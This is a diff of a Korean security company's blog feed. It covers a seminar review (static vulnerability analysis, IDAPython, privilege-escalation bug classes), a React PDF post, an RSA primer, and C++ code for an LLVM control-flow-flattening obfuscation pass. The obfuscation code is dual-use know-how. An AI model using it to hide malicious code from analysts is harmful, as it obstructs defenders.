-Blockchain에 대한 Security Audit 산업이 MEV에 대한 research로도 발전할 것이라고 보는 한호정 연구원님의 견해는 매우 흥미로운것같습니다&lt;/p&gt;
-
-&lt;p&gt;해당 발표에서는 MEV가 무엇인지, 또 MEV에는 어떠한 종류들이 있었는지, MEV를 완화시키거나 제거하기위해서 어떠한것들이 존재하는지, 마지막으로 한호정연구원님이 직접 MEV에 대해서 추출한 경험담에 대해서 소개합니다&lt;/p&gt;
-
-&lt;p&gt;영상에서는 &lt;a href=&quot;https://youtu.be/6YgSTZ9i7Vk?t=12465&quot;&gt;3:27:38&lt;/a&gt;부터 호정님의 발표가 시작됩니다. 평소 Blockchain에 대해서 관심있는 분들이라면 한번 시청해보시는것을 추천드립니다. 💰&lt;/p&gt;
-
-&lt;h2 id=&quot;closing&quot;&gt;Closing&lt;/h2&gt;
-
-&lt;p&gt;이제 첫번째 Stealien Securit Seminar를 모두 돌아 봤습니다. 흥미진진한 주제로 발표해 주신 발표자님들 모두에게 감사드리며, 스틸리언에 관심을 가져주시고 방문해주신 분들에게 무한한 감사를 보냅니다. 또한, 비록 현장에 계시진 못했지만 온라인으로 저희를 응원해 주신 분들에게도 감사를 드립니다.&lt;/p&gt;
-
-&lt;p&gt;앞으로도 멋지게 발전해 나가는 스틸리언과 스틸리언의 해커들이 되도록 하겠습니다.&lt;/p&gt;
-
-&lt;p&gt;감사합니다.&lt;/p&gt;
-
-&lt;h2 id=&quot;footnotes&quot;&gt;Footnotes&lt;/h2&gt;
-
-&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
-  &lt;ol&gt;
-    &lt;li id=&quot;fn:1&quot; role=&quot;doc-endnote&quot;&gt;
-      &lt;p&gt;Stealien Security Leader, 스틸리언 주관 멘토링 프로그램 &lt;a href=&quot;#fnref:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
-    &lt;/li&gt;
-    &lt;li id=&quot;fn:2&quot; role=&quot;doc-endnote&quot;&gt;
-      &lt;p&gt;&lt;a href=&quot;https://drive.google.com/file/d/1Mk46m5tFapZZ0y4upKxD3R6YsXb4EVZ1/view?usp=sharing&quot;&gt;Paper: 권한 상승 취약점 점검 가이드 및 탐지 방법 제안&lt;/a&gt;, &lt;a href=&quot;https://drive.google.com/file/d/1LscZyKqve60LQsPU98-RgONbP43Mivy1/view?usp=sharing&quot;&gt;Doc: 권한 상승 취약점 점검 가이드&lt;/a&gt; &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
-    &lt;/li&gt;
-  &lt;/ol&gt;
-&lt;/div&gt;</content><author><name>김도현</name></author><category term="R&amp;D" /><summary type="html">Stealien Security Seminar 1회 리뷰</summary></entry><entry xml:lang="ko"><title type="html">React로 pdf 다루기</title><link href="http://ufo.stealien.com/id/2022-06-30/pdf-with-react" rel="alternate" type="text/html" title="React로 pdf 다루기" /><published>2022-06-30T00:00:00+09:00</published><updated>2022-06-30T00:00:00+09:00</updated><id>http://ufo.stealien.com/2022-06-30/PDF-with-React-ko</id><content type="html" xml:base="http://ufo.stealien.com/2022-06-30/pdf-with-react">&lt;h1 id=&quot;react로-pdf-다루기&quot;&gt;React로 pdf 다루기&lt;/h1&gt;
+&lt;/table&gt;</content><author><name>조장현</name></author><category term="Dev" /><summary type="html">LLVM을 사용한 Control Flow Flattening 패스 개발 LLVM을 이용하여 난독화를 할 수 있으면 이를 기반으로 다양한 플랫폼에서 LLVM을 사용하여 빌드되는 코드들에 대한 공통 난독화 툴을 만들 수 있을 것이라고 생각하였습니다. 이를 위해 여러가지 난독화 및 암호화 패스를 개발하였고 이 글에서는 그 중 한 가지인 흐름 평면화 패스의 개발 과정에 대해 소개하겠습니다. LLVM이란 LLVM의 정식 명칭은 Low Level Virtual Machine입니다. 하지만 이 프로젝트의 핵심은 기존의 virtual machine 개념보다는 모듈화 되고 재사용 가능한 컴파일러 기술을 의미합니다. 그리고 이것은 target independent한 optimizer, target specific 한 어셈블리 코드를 생성하는 code generator 같은 컴파일러 도구들과 프로그래밍 언어와 어셈블리 코드 사이에 LLVM intermediate representation으로 알려진 LLVM IR이라는 중간 단계의 언어로 이루어져 있습니다. 이 글에서는 LLVM에서 모듈화된 컴파일러를 제작할 수 있는 구조인 패스를 통해 흐름 난독화를 하였습니다. Control Flow Flattening란 흐름 평면화, control flow flattening은 코드의 흐름을 평면화 시키는 난독화 기술입니다. Loop, conditional branch 같은 코드의 흐름을 전부 하나의 거대한 switch 문에 집어넣어서 모든 다른 블록으로의 이동이 단 하나의 블록으로부터 이루어지도록 만들어 코드를 분석하기 어렵게 만듭니다. 흐름 그래프가 마지막 사진과 같은 구조로 변경됩니다. 환경 구성 이 글에서는 llvm 13 버전을 바탕으로 LLVM을 빌드 하였습니다. 아래 cmake 명령이 정상적으로 실행된 후 ninja를 통해 빌드할 수 있습니다. LLVM 개발은 샘플 패스인 llvm/lib/Transforms/Hello를 덮어씌워 흐름 평면화를 위한 커스텀 패스를 개발하였습니다. cmake -G Ninja -DLLVM_PARALLEL_LINK_JOBS=1 -DCMAKE_BUILD_TYPE=Debug -DLLVM_ENABLE_PROJECTS=clang ../llvm-project/llvm 흐름 평면화 적용 시 발생하는 오류 LLVM에서 Function 클래스 아래에 존재하는 Basic Block들을 흐름 평면화의 개념에 따라 하나의 거대한 Switch Instruction 아래에 집어넣음으로써 구현해 낼 수 있습니다. 이처럼 수정을 시도할 경우 LLVM Verifier에서 수정된 내용이 유효한지 검증합니다. 흐름 그래프와 관련된 검증에는 preds라는 어떤 블록에서 이 블록으로 이동할 수 있는지에 대한 정보가 주로 사용되는데, 이와 관련된 아래 3가지 검증에서 오류가 자주 발생합니다. phi node의 경우 모든 케이스와 preds가 일치해야 한다. PHINode should have one entry for each predecessor of its parent basic block! %62 = phi i32 [ %30, %23 ], [ %35, %32 ], [ %40, %37 ], [ %60, %54 ], !dbg !1211 LLVM ERROR: Broken module found, compilation aborted! 블록 A에서 호출하는 변수는 entry block에서 블록 A에 도달하기 전에 정의되어야 한다. Instruction does not dominate all uses! %alloc = alloca i64, align 8 %load = load i64, i64* %alloc, align 8 LLVM ERROR: Broken module found, compilation aborted! Landingpad를 가진 블록은 반드시 invoke에 의해서 호출되어야 한다. Block containing LandingPadInst must be jumped to only by the unwind edge of an invoke. LLVM ERROR: Broken module found, compilation aborted! 이 문제들 중 1번과 2번은 opt에 기본으로 내장되어 있는 –reg2mem 옵션을 사용함으로써 대부분 해결할 수 있습니다. 이 옵션은 phi 노드들을 제거하고 모든 allocation을 entry block에서 하도록 수정해줍니다. 이를 적용함으로써 흐름 평면화를 진행하기 쉬워집니다. 다만 이 옵션을 적용하여도 남아있는 phi node가 있는 경우가 있어 이에 대한 예외처리를 해야 합니다. 3번의 경우 switch-case 블록에서 호출할 수 없기 때문에 예외처리를 해야 합니다. 평면화 코드 구현 우선 switch-case 문에서 호출할 수 있는 블록들을 확인해야합니다. Function 클래스에 iterator를 돌면서 위의 3번, LandingPad를 가졌는지 확인하고 아닌 것들을 벡터 형태로 수집합니다. Allocation이 이루어지는 블록은 따로 분리해 두어야 하기 때문에 entry block을 제거해주어야 합니다. vector&amp;lt;BasicBlock *&amp;gt; origBB; for (Function::iterator i = F.begin(); i != F.end(); ++i) { BasicBlock *block = &amp;amp;*i; if (!block-&amp;gt;isLandingPad()) { origBB.push_back(block); } } origBB.erase(origBB.begin()); return origBB; 그 다음 IRBuilder를 사용하여 Switch Instruction을 가지게 될 Basic Block을 만들어야 합니다. Switch 블록에는 default로 어떤 블록으로 점프할 것인지를 지정해 주어야 하는데 이것 역시 새로운 빈 블록, swDefault를 생성하여 지정해 주었습니다. BasicBlock *swDefault = BasicBlock::Create(Context, &quot;StealienCFGSwitchDefault&quot;, &amp;amp;F, *origBB.begin()); IRBuilder&amp;lt;&amp;gt; IRBswDefault(swDefault); IRBswDefault.CreateBr(*origBB.begin()); BasicBlock *startSwitch = BasicBlock::Create(Context, &quot;StealienCFGswitch&quot;, &amp;amp;F, swDefault); IRBuilder&amp;lt;&amp;gt; IRBswitch(startSwitch); 그 다음 Switch에서 사용할 변수를 Entry Block에서 allocation을 해 준 뒤, Switch 블록에서 이 값을 Value add로 가져오도록 설정합니다. AllocaInst *switchVar = new AllocaInst(llvm::Type::getInt64Ty(Context), AddrSpace, nullptr, AllocaAlign, &quot;&quot;, entryBlock-&amp;gt;getTerminator()); LoadInst *load = IRBswitch.CreateAlignedLoad(llvm::Type::getInt64Ty(Context), switchVar, MaybeAlign(8)); Value *add = IRBswitch.CreateAdd(load, ConstantInt::get(llvm::Type::getInt64Ty(Context), 762167)); 그 후 IRBSwitch에 Switch Instruction을 생성합니다. randomArr은 특정 범위의 수를 랜덤한 순서로 섞은 리스트이며, 이 값들을 사용해서 아래와 같이 case들을 추가해줍니다. switchI = IRBswitch.CreateSwitch(add, swDefault, randomArr[origBB.size()]); for (BasicBlock *setSwitchBlocks : origBB) { BasicBlock *selectedBlock = setSwitchBlocks; if(!this-&amp;gt;hasPHI(selectedBlock)) { ConstantInt *constCase = llvm::ConstantInt::get(llvm::Type::getInt64Ty(Context), randomArr[index]); switchI-&amp;gt;addCase(constCase, selectedBlock); } } 마지막으로 origBB에 있는 BasicBlock 들의 Terminator를 BranchInst인지 그리고 Successor 개수에 따라 분류할 수 있습니다. BranchInst는 1개 혹은 2개의 Successor를 가지며, 이것들이 수정 대상입니다. Branch Instruction이 아닌 경우 : return 혹은 unreachable 같은 종류되는 경우 혹은 invoke와 같이 수정이 불가능한 Terminating Instruction인 경우 Branch Instruction의 Successor가 1인 경우 : branch BlockA 같이 다른 블록으로 이동하는 경우 Branch Instruction의 Successor가 2인 경우 : branch condition BlockA BlockB 처럼 condition 값에 따라 이동하는 블록이 이동되는 경우 따라서 Branch Instruction에서 이동할 블록에 지정된 값을 Switch Instruction에서 찾아서 위에서 생성해둔 switchVar에 저장해주고 Switch Block으로 돌아가면 자동으로 이걸 로드해서 원하는 블록으로 이동하게 될 것입니다. Successor의 개수가 1인 경우에 대한 코드는 아래와 같습니다. 2인 경우에도 둘 다에 대해 동일하게 처리해주면 됩니다. 아래 코드에서는 Switch Instruction에서 가져온 intCase 값이 직접 드러나는 것을 숨기기 위해 추가적인 덧셈과 곱셈을 수행하도록 하였습니다. if(!isa&amp;lt;BranchInst&amp;gt;(selectedBlock-&amp;gt;getTerminator())){ continue; } uint64_t successors = selectedBlock-&amp;gt;getTerminator()-&amp;gt;getNumSuccessors(); if (successors == 1) { BasicBlock *follow = selectedBlock-&amp;gt;getTerminator()-&amp;gt;getSuccessor(0); ConstantInt *intCase = switchI-&amp;gt;findCaseDest(follow); if (intCase == NULL) { continue; } selectedBlock-&amp;gt;getTerminator()-&amp;gt;eraseFromParent(); IRBuilder&amp;lt;NoFolder&amp;gt; tempBuilder(selectedBlock); uint64_t origCase = intCase-&amp;gt;getSExtValue() - addVal; uint64_t randVal = 17+rand()%10000; Value * mul = tempBuilder.CreateMul(ConstantInt::get(llvm::Type::getInt64Ty(Context), origCase/randVal), ConstantInt::get(llvm::Type::getInt64Ty(Context), randVal)); Value * add = tempBuilder.CreateAdd(mul, ConstantInt::get(llvm::Type::getInt64Ty(Context), origCase%randVal)); tempBuilder.CreateAlignedStore(add, switchVar, MaybeAlign(8)); tempBuilder.CreateBr(startSwitch); } 전후비교 위와 같은 Control Flow Flattening 작업을 수행하면 아래와 같은 코드를 얻을 수 있습니다. Opt의 -dot-cfg 옵션을 사용하여 흐름 평면화 전용 전과 후를 비교하면 StealienCFGswitch 라는 Switch 블록이 추가된 것과 모든 블록이 다시 이 블록으로 돌아가는 난독화 기능이 적용된 것을 확인할 수 있습니다. 이러한 난독화 기능은 다른 난독화 기능들과 함께 적용하면 훨씬 더 분석하기 어려운 코드를 만들어 낼 수 있습니다. 기존 흐름 그래프 평면화 모듈 적용 후 흐름 그래프</summary></entry><entry xml:lang="ko"><title type="html">React로 pdf 다루기</title><link href="http://ufo.stealien.com/id/2022-06-30/pdf-with-react" rel="alternate" type="text/html" title="React로 pdf 다루기" /><published>2022-06-30T00:00:00+09:00</published><updated>2022-06-30T00:00:00+09:00</updated><id>http://ufo.stealien.com/2022-06-30/PDF-with-React-ko</id><content type="html" xml:base="http://ufo.stealien.com/2022-06-30/pdf-with-react">&lt;h1 id=&quot;react로-pdf-다루기&quot;&gt;React로 pdf 다루기&lt;/h1&gt;
 
 &lt;p&gt;올해 초, &lt;strong&gt;월간 레포트 리뉴얼&lt;/strong&gt; 이라는 업무를 새롭게 배정받게 되었습니다.
 디자인은 회사 대표 디자이너이신 재성님이 아주 아름답게 만들어주셨지만, 코드로 PDF를 만들거나 다뤄본 적이 없는 저는 막연한 두려움을 갖게 되었습니다.&lt;/p&gt;
@@ -2133,371 +2733,121 @@ Blockchain에 대한 Security Audit 산업이 MEV에 대한 research로도 발�
 
 &lt;p&gt;이제는 제가 만든 새로운 코드를 기반으로 많은 고객사에 앱슈트 월간 레포트가 전달되고 있습니다.&lt;/p&gt;
 
-&lt;p&gt;처음에 기획했던 기능들을 전부 넣지는 못했지만, 계속 업데이트를 해서 사내에서 가장 유용하게 사용하는 프로젝트가 되기를 바랍니다.&lt;/p&gt;</content><author><name>하준혁</name></author><category term="Dev" /><summary type="html">React로 pdf 다루기</summary></entry><entry xml:lang="ko"><title type="html">Homomorphism in RSA</title><link href="http://ufo.stealien.com/id/2022-06-08/homomorphism-in-rsa" rel="alternate" type="text/html" title="Homomorphism in RSA" /><published>2022-06-08T00:00:00+09:00</published><updated>2022-06-08T00:00:00+09:00</updated><id>http://ufo.stealien.com/2022-06-08/homomorphism-in-rsa-ko</id><content type="html" xml:base="http://ufo.stealien.com/2022-06-08/homomorphism-in-rsa">&lt;h1 id=&quot;homomorphism-in-rsa&quot;&gt;Homomorphism in RSA&lt;/h1&gt;
+&lt;p&gt;처음에 기획했던 기능들을 전부 넣지는 못했지만, 계속 업데이트를 해서 사내에서 가장 유용하게 사용하는 프로젝트가 되기를 바랍니다.&lt;/p&gt;</content><author><name>하준혁</name></author><category term="Dev" /><summary type="html">React로 pdf 다루기</summary></entry><entry xml:lang="ko"><title type="html">Stealien Security Seminar 1회 리뷰</title><link href="http://ufo.stealien.com/id/2022-06-30/stealien-security-seminar" rel="alternate" type="text/html" title="Stealien Security Seminar 1회 리뷰" /><published>2022-06-30T00:00:00+09:00</published><updated>2022-06-30T00:00:00+09:00</updated><id>http://ufo.stealien.com/2022-06-30/2022_3s_review-ko</id><content type="html" xml:base="http://ufo.stealien.com/2022-06-30/stealien-security-seminar">&lt;h1 id=&quot;stealien-security-seminar-1회-리뷰&quot;&gt;Stealien Security Seminar 1회 리뷰&lt;/h1&gt;
 
-&lt;h1 id=&quot;서론&quot;&gt;서론&lt;/h1&gt;
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2022-06-30-2022_3s_review/banner.png&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;Banner&lt;/i&gt;
+&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/001_markus-spiske-iar-afB0QQw-unsplash_edit.jpg&quot; alt=&quot;001_markus-spiske-iar-afB0QQw-unsplash_edit.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;안녕하세요! 저는 스틸리언의 김도현 선임연구원입니다.&lt;/p&gt;
 
-&lt;p&gt;해킹에 관심을 가지게 된 사람이라면 누구든지 그 실력을 기르기 위해 워게임(Wargame) 사이트에서 문제들을 풀거나 CTF(Capture The Flag) 대회에 출전해 본 적이 있을 것이다. 웹(Web), 리버싱(Reversing), 포너블(Pwnable) 등 여러 분야의 문제들을 만나볼 수 있는데, 특별한 경우를 제외하고 항상 등장하는 분야가 있다. 바로 &lt;strong&gt;암호학(Cryptography)&lt;/strong&gt; 분야이다.&lt;/p&gt;
+&lt;p&gt;2022년 6월 29일, 스틸리언에서 주관하는 첫 세미나가 성공적으로 진행되었습니다.&lt;/p&gt;
 
-&lt;p&gt;자주 등장하는 만큼 패기 있게 문제를 풀어보려 하지만 암호학 분야의 문제를 처음 접해보는 사람이라면 누구든지 괴상하게 뒤죽박죽 섞여 있거나 숫자로만 되어 있는 암호문을 받아보며 이것을 풀어서 정답을 제출하라는 말에 어떻게 해야 할지 시작부터 &lt;strong&gt;막막했던 경험&lt;/strong&gt;이 있을 것이다.&lt;/p&gt;
+&lt;p&gt;대망의 첫 세미나에서는 SSL&lt;sup id=&quot;fnref:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; 수료생 분들의 연구에 대해 소개하는 &lt;strong&gt;SSL 세션&lt;/strong&gt;과, 스틸리언 연구원들의 연구에 대해 소개하는 &lt;strong&gt;Open 세션&lt;/strong&gt; 그리고 오프라인에서만 진행하는 &lt;strong&gt;Secret 세션&lt;/strong&gt;이 있었는데요, 이번 세미나는 &lt;a href=&quot;https://www.youtube.com/watch?v=6YgSTZ9i7Vk&quot;&gt;유튜브를 통해 온라인&lt;/a&gt;으로도 송출하였기 때문에 혹시나 내용을 중간에 놓치셨거나, 시간이 없어 참석하지 못하신 분들은 다시보기를 통해 언제든 자유롭게 저희의 발표를 즐겨주시면 감사하겠습니다.&lt;/p&gt;
 
-&lt;p&gt;이번 글에서는 암호학이라는 분야에 대해 막연히 어렵고 복잡하다고 생각하는 사람들을 위해 암호학 분야의 워게임 문제에서 가장 흔하게 나오고 실제 필드에서도 많이 쓰이는 공개키 암호화 기법의 기본 중의 기본, &lt;strong&gt;RSA&lt;/strong&gt; 와 관련된 문제를 풀어보며 암호학이라는 게 그렇게 어렵고 막막하기만 한 것은 아니라는 점을 배워갈 수 있다면 좋겠다.&lt;/p&gt;
+&lt;p&gt;혹시나 아직 이번 세미나의 재미있는 발표 주제들을 듣지 못 하신분들을 위해서 이렇게 주제들에 대한 간단한 소개와 요약을 작성해 보았습니다.&lt;/p&gt;
 
-&lt;hr /&gt;
+&lt;h2 id=&quot;open-static-vulnerability-analysis&quot;&gt;[Open] Static Vulnerability Analysis&lt;/h2&gt;
 
-&lt;h1 id=&quot;본론&quot;&gt;본론&lt;/h1&gt;
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2022-06-30-2022_3s_review/dhkim.jpg&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;발표 현장&lt;/i&gt;
+&lt;/p&gt;
 
-&lt;h2 id=&quot;그래서-rsa-가-뭔가요&quot;&gt;그래서 RSA 가 뭔가요?&lt;/h2&gt;
+&lt;p&gt;세미나의 첫발은 제가 내디뎠습니다.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/002_RSA_inventors.jpeg&quot; alt=&quot;002_RSA_inventors.jpeg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;저의 주요 관심사 중 한가지는 다양한 어플리케이션 또는 임베디드 장비의 취약점을 찾는 것입니다.
+이런류의 버그바운티 또는 프로젝트를 해 보신분들은 잘 아시겠지만, 생각보다는 국내의 타겟들은 아직도 복잡도가 낮은 취약점들이 많이 나오고 있습니다.&lt;/p&gt;
 
-&lt;p&gt;RSA 는 1978년에 최초로 이 암호시스템을 연구하여 체계화시킨 Ron &lt;strong&gt;R&lt;/strong&gt;ivest, Adi &lt;strong&gt;S&lt;/strong&gt;hamir, Leonard &lt;strong&gt;A&lt;/strong&gt;dleman 의 이름 앞 글자를 따 만들어진 &lt;strong&gt;암호화&lt;/strong&gt;뿐만 아니라 &lt;strong&gt;전자서명&lt;/strong&gt;까지 가능한 최초의 알고리즘이다.&lt;/p&gt;
+&lt;p&gt;이런 취약점들을 effortless하게 발굴하기 위해서 저는 Static Vulnerability Analysis 또는 Static Program Analysis for Vulnerability Research라는 방법을 이용했습니다. 이번 발표에서는 Static Vulnerability Analysis에 대한 기본적인 소개와, Fuzzing과 비교하여 이 기법의 장점과 단점에 대해 설명하고, 간단한 몇가지 테크닉에 대해 발표했습니다.&lt;/p&gt;
 
-&lt;p&gt;이 RSA 의 강력함은 다음 두 가지에서 나온다.&lt;/p&gt;
+&lt;p&gt;또한 마지막에는 소개드린 주제를 바탕으로 SSL 3기에서 진행할 내용에 대해 소개 드렸습니다.&lt;/p&gt;
 
-&lt;ol&gt;
-  &lt;li&gt;암/복호화, 서명/검증에 필요한 수학적인 계산 과정이 굉장히 간단하고 빠르다는 것.&lt;/li&gt;
-  &lt;li&gt;큰 숫자의 소인수분해의 어려움을 이용한 강력한 안전성을 제공하고 있다는 것.&lt;/li&gt;
-&lt;/ol&gt;
+&lt;p&gt;영상에서는 &lt;a href=&quot;https://youtu.be/6YgSTZ9i7Vk?t=1729&quot;&gt;28:49&lt;/a&gt;부터 저의 발표가 시작되니, 재미있게 들어주시면 감사하겠습니다 🤩&lt;/p&gt;
 
-&lt;p&gt;위 두 가지의 강점으로 인해 현재까지도 RSA 는 널리 쓰이고 있다.&lt;/p&gt;
+&lt;h2 id=&quot;ssl-idapython으로-분석을-더-편하게-하는-방법&quot;&gt;[SSL] IDAPython으로 분석을 더 편하게 하는 방법&lt;/h2&gt;
 
-&lt;p&gt;다음으로는 왜 RSA 의 강점을 위 두 가지로 꼽았는지 키 생성부터 암/복호화, 서명/검증 과정을 살펴보며 알아보도록 하겠다.&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2022-06-30-2022_3s_review/snwo.jpg&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;발표 현장&lt;/i&gt;
+&lt;/p&gt;
 
-&lt;h2 id=&quot;rsa-키-생성&quot;&gt;RSA 키 생성&lt;/h2&gt;
+&lt;p&gt;두번째 발표는 SSL 2기 수료생 황선우님이 진행해 주셨습니다.&lt;/p&gt;
 
-&lt;ol&gt;
-  &lt;li&gt;서로 다른 &lt;strong&gt;소수 p, q&lt;/strong&gt; 를 랜덤하게 선택한다.&lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;strong&gt;n = p * q&lt;/strong&gt; 를 계산한다.
-&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/003_npq.png&quot; alt=&quot;003_n=pq.png&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;n 에 대하여 &lt;strong&gt;오일러 피 함수(Euler’s phi (totient) function)&lt;/strong&gt; 또는 &lt;strong&gt;카마이클 함수(Carmichael function)&lt;/strong&gt; 중 하나를 선택하여 계산한다.
-    &lt;ul&gt;
-      &lt;li&gt;오일러 피 함수 (&lt;a href=&quot;https://ko.wikipedia.org/wiki/%EC%98%A4%EC%9D%BC%EB%9F%AC_%ED%94%BC_%ED%95%A8%EC%88%98&quot;&gt;https://ko.wikipedia.org/wiki/오일러_피_함수&lt;/a&gt;)
- &lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/004_phi.png&quot; alt=&quot;004_phi.png&quot; /&gt;&lt;/li&gt;
-      &lt;li&gt;카마이클 함수 (&lt;a href=&quot;https://en.wikipedia.org/wiki/Carmichael_function&quot;&gt;https://en.wikipedia.org/wiki/Carmichael_function&lt;/a&gt;)
- &lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/005_lambda.png&quot; alt=&quot;005_lambda.png&quot; /&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;3번에서 선택한 수와 &lt;strong&gt;서로소인 정수 e&lt;/strong&gt; 를 고른다.&lt;/p&gt;
+&lt;p&gt;IDA Pro에서 제공하는 API를 이용하여 malware 분석, plugin에 대한 소개 및 CTF 문제를 IDAPython으로 해결하는 방법에 대해 소개 해 주셨습니다.
+특히 Windows OS의 application이 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetModuleHandleA()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LoadLibraryA()&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetProcAddress()&lt;/code&gt; chain을 이용해 binary에서 실행하고자 하는 procedure의 주소를 가져올 때, IDAPython을 이용하여 난독화 된 대상 library 및 procedure의 이름(문자열)을 복구할 수 있는 방법을 소개 해 주셨던 점이 저에게는 인상깊었습니다.&lt;/p&gt;
 
-    &lt;p&gt;(두 정수 a, b 의 최대공약수(gcd)가 1 이면 둘은 서로소이다.)&lt;/p&gt;
+&lt;p&gt;이후에는 &lt;a href=&quot;https://ctftime.org/event/1583&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b01lers CTF - TM&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://ctftime.org/task/20424&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DCTF - Glade&lt;/code&gt;&lt;/a&gt; 문제를 직접 IDAPython을 이용하여 분석하는 예를 보여주시기도 하였습니다.&lt;/p&gt;
 
-    &lt;p&gt;(두 수가 서로소가 아니면 모듈러 역원을 구할 수 없다 → 개인키를 구할 수 없다.)&lt;/p&gt;
+&lt;p&gt;영상에서는 &lt;a href=&quot;https://youtu.be/6YgSTZ9i7Vk?t=4105&quot;&gt;1:08:25&lt;/a&gt;부터 선우님의 발표가 시작되니, IDAPython의 강력한 기능을 이용해 보고 싶으신 분들은 한번 꼭 시청 해 보셔야겠네요 😎&lt;/p&gt;
 
-    &lt;p&gt;&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/006_gcd_coprime.png&quot; alt=&quot;006_gcd_coprime.png&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;ssl-권한-상승-취약점-분석-방법론--a&quot;&gt;[SSL] 권한 상승 취약점 분석 방법론 + a&lt;/h2&gt;
 
-    &lt;p&gt;(일반적으로 계산의 효율성을 위해 &lt;a href=&quot;https://ko.wikipedia.org/wiki/%ED%8E%98%EB%A5%B4%EB%A7%88_%EC%88%98&quot;&gt;페르마 수(Fermat Number)&lt;/a&gt;가 선택된다.)&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/assets/2022-06-30-2022_3s_review/jhjang.jpg&quot; /&gt;&lt;br /&gt;
+    &lt;i&gt;발표 현장&lt;/i&gt;
+&lt;/p&gt;
 
-    &lt;p&gt;&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/007_Fermat_numbers.png&quot; alt=&quot;007_Fermat_numbers.png&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;정수 e 에 대한 &lt;strong&gt;모듈러 역원인 d&lt;/strong&gt; 를 계산한다.
-&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/008_private_key_d.png&quot; alt=&quot;008_private_key_d.png&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;위에서 계산한 값들 중 &lt;strong&gt;n, e 를 공개키&lt;/strong&gt;로써 배포하고, &lt;strong&gt;d 를 개인키&lt;/strong&gt;로써 절대 노출되지 않게 한다.
-&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/009_keys.png&quot; alt=&quot;009_keys.png&quot; /&gt;&lt;/li&gt;
-&lt;/ol&gt;
+&lt;p&gt;세번째 발표 또한 SSL 2기 수료생 장재훈님이 진행해 주셨습니다.&lt;/p&gt;
 
-&lt;p&gt;이제 해당 공개키를 이용하여 누구든지 메시지를 암호화해서 보내면 개인키를 가지고 있는 소유자만 해당 메시지를 복호화할 수 있다. 그렇다면 암/복호화는 어떻게 수행될까? 한번 살펴보자.&lt;/p&gt;
+&lt;p&gt;장재훈님께서는 SSL 2기의 주제인 ‘권한 상승 취약점 분석 방법론’을 바탕으로 추가로 연구한 내용을 더해 이번 발표를 해 주셨습니다.
+방법론&lt;sup id=&quot;fnref:2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;에는 권한 상승 취약점을 관리적 측면, 기술적 측면으로 나누어 소개하고 있는데, 각 취약점에 대한 디테일이 더해져 보는 맛이 있는 발표였던 것 같습니다.&lt;/p&gt;
 
-&lt;h2 id=&quot;rsa-암호화&quot;&gt;RSA 암호화&lt;/h2&gt;
+&lt;p&gt;또한 이번 발표에는 ‘File Junction’, ‘Named Pipe Impersonation’ 등 개발자가 유의하지 않으면 발생하기 쉽고, 치명적인 버그 클래스들에 대해서도 소개 해 주셨습니다.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/2022-06-08-homomorphism-in-rsa/010_enc.png&quot; alt=&quot;010_enc.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;요즘의 시스템들은 권한 분리가 잘 되어있는 경우가 많아지고 있지만, 권한이 분리 된 환경에서도 여전히 실수가 발생하면 성공적으로 공격을 수행시킬 수 있다는 사실을 이번 발표를 통해 잘 보여주신 것 같습니다.&lt;/p&gt;
 
-&lt;h2 id=&quot;rsa-복호화&quot;&gt;RSA 복호화&lt;/h2&gt;
